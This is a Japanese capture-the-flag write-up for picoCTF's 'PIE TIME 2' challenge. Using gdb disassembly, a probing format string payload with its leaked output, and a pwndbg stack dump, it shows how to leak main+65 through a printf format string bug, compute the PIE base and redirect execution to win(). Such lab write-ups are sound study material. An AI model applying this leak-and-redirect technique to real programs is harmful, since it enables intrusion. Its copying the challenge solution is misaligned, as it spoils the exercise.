# PIE TIME 2

## 事前調査

`addr to win()` 0x000000000000136a

```plaintext
Dump of assembler code for function main:
   0x0000000000001400 <+0>:     endbr64
   0x0000000000001404 <+4>:     push   %rbp
   0x0000000000001405 <+5>:     mov    %rsp,%rbp
   0x0000000000001408 <+8>:     lea    -0x166(%rip),%rsi        # 0x12a9 <segfault_handler>
   0x000000000000140f <+15>:    mov    $0xb,%edi
   0x0000000000001414 <+20>:    call   0x1170 <signal@plt>
   0x0000000000001419 <+25>:    mov    0x2bf0(%rip),%rax        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x0000000000001420 <+32>:    mov    $0x0,%ecx
   0x0000000000001425 <+37>:    mov    $0x2,%edx
   0x000000000000142a <+42>:    mov    $0x0,%esi
   0x000000000000142f <+47>:    mov    %rax,%rdi
   0x0000000000001432 <+50>:    call   0x1180 <setvbuf@plt>
   0x0000000000001437 <+55>:    mov    $0x0,%eax
   0x000000000000143c <+60>:    call   0x12c7 <call_functions>
   0x0000000000001441 <+65>:    mov    $0x0,%eax
   0x0000000000001446 <+70>:    pop    %rbp
   0x0000000000001447 <+71>:    ret
End of assembler dump.
(gdb) disass call_functions
Dump of assembler code for function call_functions:
   0x00000000000012c7 <+0>:     endbr64
   0x00000000000012cb <+4>:     push   %rbp
   0x00000000000012cc <+5>:     mov    %rsp,%rbp
   0x00000000000012cf <+8>:     sub    $0x60,%rsp
   0x00000000000012d3 <+12>:    mov    %fs:0x28,%rax
   0x00000000000012dc <+21>:    mov    %rax,-0x8(%rbp)
   0x00000000000012e0 <+25>:    xor    %eax,%eax
   0x00000000000012e2 <+27>:    lea    0xd45(%rip),%rdi        # 0x202e
   0x00000000000012e9 <+34>:    mov    $0x0,%eax
   0x00000000000012ee <+39>:    call   0x1140 <printf@plt>
   0x00000000000012f3 <+44>:    mov    0x2d26(%rip),%rdx        # 0x4020 <stdin@@GLIBC_2.2.5>
   0x00000000000012fa <+51>:    lea    -0x50(%rbp),%rax
   0x00000000000012fe <+55>:    mov    $0x40,%esi
   0x0000000000001303 <+60>:    mov    %rax,%rdi
   0x0000000000001306 <+63>:    call   0x1160 <fgets@plt>
   0x000000000000130b <+68>:    lea    -0x50(%rbp),%rax
   0x000000000000130f <+72>:    mov    %rax,%rdi
   0x0000000000001312 <+75>:    mov    $0x0,%eax
   0x0000000000001317 <+80>:    call   0x1140 <printf@plt>
   0x000000000000131c <+85>:    lea    0xd1d(%rip),%rdi        # 0x2040
   0x0000000000001323 <+92>:    mov    $0x0,%eax
   0x0000000000001328 <+97>:    call   0x1140 <printf@plt>
   0x000000000000132d <+102>:   lea    -0x60(%rbp),%rax
   0x0000000000001331 <+106>:   mov    %rax,%rsi
   0x0000000000001334 <+109>:   lea    0xd34(%rip),%rdi        # 0x206f
   0x000000000000133b <+116>:   mov    $0x0,%eax
   0x0000000000001340 <+121>:   call   0x11a0 <__isoc99_scanf@plt>
   0x0000000000001345 <+126>:   mov    -0x60(%rbp),%rax
   0x0000000000001349 <+130>:   mov    %rax,-0x58(%rbp)
   0x000000000000134d <+134>:   mov    -0x58(%rbp),%rax
   0x0000000000001351 <+138>:   call   *%rax
   0x0000000000001353 <+140>:   nop
   0x0000000000001354 <+141>:   mov    -0x8(%rbp),%rax
   0x0000000000001358 <+145>:   xor    %fs:0x28,%rax
   0x0000000000001361 <+154>:   je     0x1368 <call_functions+161>
   0x0000000000001363 <+156>:   call   0x1130 <__stack_chk_fail@plt>
   0x0000000000001368 <+161>:   leave
   0x0000000000001369 <+162>:   ret
End of assembler dump.
```

## 解法

まず、`printf` にフォーマット文字列を直接渡せてしまう脆弱性があることが分かる。

`ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx` を入力すると、

```plaintext
ABCDEFGH.59cd20f8c2a1.0.59cd20f8c2dd.7ffec3410270.7c.7ffec3503228.721f4419c6a0.4847464544434241.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e
```

と出力された。ここから「ABCDEFGH」を示す `4847464544434241` はフォーマット文字列で8番目に参照されるデータということが分かった。

次に、脆弱性のある `printf` が呼び出される直前のスタックを見ると以下の通りであった。

```plaintext
pwndbg> tele rsp 20
00:0000│ rsp 0x7fffffffd550 —▸ 0x7fffffffd570 ◂— '.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
01:0008│-058 0x7fffffffd558 —▸ 0x7ffff7e35415 (_IO_file_setbuf+21) ◂— test rax, rax
02:0010│ rdi 0x7fffffffd560 ◂— 'ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
03:0018│-048 0x7fffffffd568 ◂— '.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx\n'
... ↓        5 skipped
09:0048│-018 0x7fffffffd598 ◂— 0xa786c252e /* '.%lx\n' */
0a:0050│-010 0x7fffffffd5a0 ◂— 0
0b:0058│-008 0x7fffffffd5a8 ◂— 0xa3706407a7966c00
0c:0060│ rbp 0x7fffffffd5b0 —▸ 0x7fffffffd5c0 —▸ 0x7fffffffd660 —▸ 0x7fffffffd6c0 ◂— 0
0d:0068│+008 0x7fffffffd5b8 —▸ 0x555555555441 (main+65) ◂— mov eax, 0
0e:0070│+010 0x7fffffffd5c0 —▸ 0x7fffffffd660 —▸ 0x7fffffffd6c0 ◂— 0
0f:0078│+018 0x7fffffffd5c8 —▸ 0x7ffff7dcd1ca (__libc_start_call_main+122) ◂— mov edi, eax
10:0080│+020 0x7fffffffd5d0 —▸ 0x7fffffffd610 ◂— 0
11:0088│+028 0x7fffffffd5d8 —▸ 0x7fffffffd6e8 —▸ 0x7fffffffd9f6 ◂— '/home/yuki/ctf/ctf-archive/picoctf-archive/picoctf_2025/binary_exploitation/pie_time_2/vuln'
12:0090│+030 0x7fffffffd5e0 ◂— 0x155554040
13:0098│+038 0x7fffffffd5e8 —▸ 0x555555555400 (main) ◂— endbr64
```

これより、rsp+0x68 の位置に `main+65` のアドレスがあることが分かる。
入力した文字列の先頭はフォーマット文字列から8番目に参照されるデータで rsp+0x10 の位置にあることから、
(0x68 - 0x10) / 8 + 8 = 19番目のフォーマット文字列で `main+65` のアドレスをリークできることが分かる。

ここで、PIE が適応される前の `main+65` のアドレスは 0x0000000000001441 であったから、ここから PIE のオフセットを計算できる。
最後に `win` の　`0x000000000000136a` にオフセットを足せばよい。
